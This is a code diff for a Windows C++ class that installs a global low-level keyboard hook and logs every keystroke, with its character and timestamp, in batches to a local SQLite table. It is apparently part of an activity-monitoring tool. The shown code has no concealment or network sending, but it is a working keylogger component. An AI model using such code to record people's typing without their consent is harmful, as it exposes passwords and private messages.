@@ -11,68 +11,88 @@
 
 HHOOK KeyboardCapture::keyboardHook = NULL;
 bool KeyboardCapture::exists = false;
+KeyboardCapture* KeyboardCapture::self = nullptr;
+
 
 KeyboardCapture::KeyboardCapture() {
     if(exists)
-        throw instance_exists_error("Keyboard Capture");
+        throw instance_exists_error("KeyboardCapture::KeyboardCapture");
     exists = true;
     self = this;
     infoType = FlobGlobal::Keypress;
-    sql_table = "CREATE TABLE IF NOT EXISTS keypress_type("
+    auto n = now();
+    char date[11] = {0};
+    sprintf(date,"%02d_%02d_%04d",n->tm_mday, n->tm_mon+1, n->tm_year+1900);
+    keyTable = "KeyPress_"+std::string(date)+"_"+from_wstring(computerHandleStr())+"_CPACTIVITY";
+    sql_table = "CREATE TABLE IF NOT EXISTS "+keyTable+"("
                 "id INTEGER PRIMARY KEY,"
-                "up INTEGER,"
+                "click_down INTEGER,"
                 "scancode INTEGER,"
                 "vkcode INTEGER,"
                 "char TEXT,"
                 "time TEXT);";
-
-    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL,llkeyhook, NULL,0);
+    FlobbelSafe::self->buildTable(sql_table);
+    Log::self->info("KeyboardCapture::KeyboardCapture", "Table build verified: "+sql_table);
+    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL,llkeyhook, NULL, 0);
+    Log::self->info("KeyboardCapture::KeyboardCapture", "Hook set");
 }
 
 KeyboardCapture::~KeyboardCapture() {
     UnhookWindowsHookEx(keyboardHook);
+    Log::self->info("KeyboardCapture::~KeyboardCapture", "Hook Procedure unhooked");
 }
 
 void KeyboardCapture::sql_action(const Info* inf){
     auto pack = (KeypressInfo*)inf;
-    FCS.safe->insert_data(L"INSERT INTO keypress_type(up, scancode, vkcode, char, time) VALUES (?,?,?,?,?)",
-                          {
-                            new sql_int(0),
-                            new sql_int(pack->scancode),
-                            new sql_int(pack->vkcode),
-                            new sql_str(pack->descr),
-                            new sql_str(pack->timestamp)
-                          });
+    accumulation_queue.push(*pack);
+    if(accumulation_queue.size() < 25) return;
+    std::wstring sql_starter = L"INSERT INTO "+from_string(keyTable) + L"(click_down, scancode, vkcode, char, time) VALUES"
+                                "(?,?,?,?,?),(?,?,?,?,?),(?,?,?,?,?),(?,?,?,?,?),(?,?,?,?,?),"
+                                "(?,?,?,?,?),(?,?,?,?,?),(?,?,?,?,?),(?,?,?,?,?),(?,?,?,?,?),"
+                                "(?,?,?,?,?),(?,?,?,?,?),(?,?,?,?,?),(?,?,?,?,?),(?,?,?,?,?),"
+                                "(?,?,?,?,?),(?,?,?,?,?),(?,?,?,?,?),(?,?,?,?,?),(?,?,?,?,?),"
+                                "(?,?,?,?,?),(?,?,?,?,?),(?,?,?,?,?),(?,?,?,?,?),(?,?,?,?,?);";
+
+    std::deque<sql_basetype*> arguments;
+    for(auto x = accumulation_queue.front();!accumulation_queue.empty();x = accumulation_queue.front(), accumulation_queue.pop()){
+        arguments.push_back(new sql_int(x.clickdown));
+        arguments.push_back(new sql_int(x.scancode));
+        arguments.push_back(new sql_int(x.vkcode));
+        arguments.push_back(new sql_str(x.descr));
+        arguments.push_back(new sql_str(x.timestamp));
+    }
+    FlobbelSafe::self->insert_data(sql_starter, arguments, 5);
 }
 
 LRESULT KeyboardCapture::llkeyhook(int nCode, WPARAM wParam, LPARAM lParam) {
-    if(nCode != HC_ACTION) return CallNextHookEx(keyboardHook,nCode,wParam,lParam);
-    KeypressInfo info;
-    KBDLLHOOKSTRUCT *further = (KBDLLHOOKSTRUCT*)lParam;
-    std::wstring time = timestamp();
+    if(nCode == HC_ACTION) {
+        KeypressInfo info;
+        auto further = (KBDLLHOOKSTRUCT *) lParam;
+        std::wstring time = timestamp();
 
-    switch(wParam){
-        case WM_KEYDOWN:
-            info.updown += 0;
-            break;
-        case WM_KEYUP:
-            info.updown += 1;
-            break;
-        case WM_SYSKEYDOWN:
-            info.updown += 2;
-            break;
-        case WM_SYSKEYUP:
-            info.updown += 3;
-            break;
-        default:
-            info.updown += -1;
+        switch (wParam) {
+            case WM_KEYDOWN:
+                info.clickdown += 1;
+                break;
+            case WM_KEYUP:
+                info.clickdown += 0;
+                break;
+            case WM_SYSKEYDOWN:
+                info.clickdown += 1;
+                break;
+            case WM_SYSKEYUP:
+                info.clickdown += 0;
+                break;
+            default:
+                info.clickdown += -1;
+        }
+        info.ch = FCS.handle;
+        info.infotype = FlobGlobal::Keypress;
+        info.scancode = (unsigned) further->scanCode;
+        info.vkcode = (unsigned) further->vkCode;
+        info.timestamp = time;
+        wcsncpy(info.descr, map(info.vkcode).c_str(), (size_t) 4);
+        self->sql_action(&info);
     }
-    info.ch = FCS.handle;
-    info.infotype = FlobGlobal::Keypress;
-    info.scancode = (unsigned)further->scanCode;
-    info.vkcode = (unsigned)further->vkCode;
-    info.timestamp = time;
-    wcsncpy(info.descr,map(info.vkcode).c_str(),(size_t)4);
-    self->sql_action(&info);
     return CallNextHookEx(keyboardHook,nCode,wParam,lParam);
 }
